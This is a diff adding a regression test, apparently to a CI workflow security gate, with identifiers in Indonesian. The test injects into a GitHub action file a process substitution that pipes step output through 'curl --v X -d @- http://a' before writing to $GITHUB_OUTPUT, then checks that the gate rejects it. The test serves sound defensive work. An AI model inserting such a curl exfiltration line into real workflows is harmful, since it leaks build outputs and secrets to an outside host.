@@ -41153,6 +41153,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("diff opsi panjang tak dikenal kini ditolak (Audit 2871)", rc != 0)
         shutil.rmtree(sub1942, ignore_errors=True)
+        sub1943 = klon(tmp, "sub1943")
+        berkas_aksi1943 = os.path.join(
+            sub1943, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1943, encoding="utf-8") as f:
+            isi_aksi1943 = f.read()
+        baris_aksi1943 = [b for b in isi_aksi1943.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1943 = isi_aksi1943.replace(
+                baris_aksi1943,
+                baris_aksi1943.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --v X -d @- http://a; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1943 != isi_aksi1943, \
+            "suntikan aksi1943 tidak menembak"
+        with open(berkas_aksi1943, "w", encoding="utf-8") as f:
+            f.write(isi_baru1943)
+        rc, out = jalan(sub1943,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("curl awalan ambigu himpunan penuh kini ditolak (Audit 2872)", rc != 0)
+        shutil.rmtree(sub1943, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
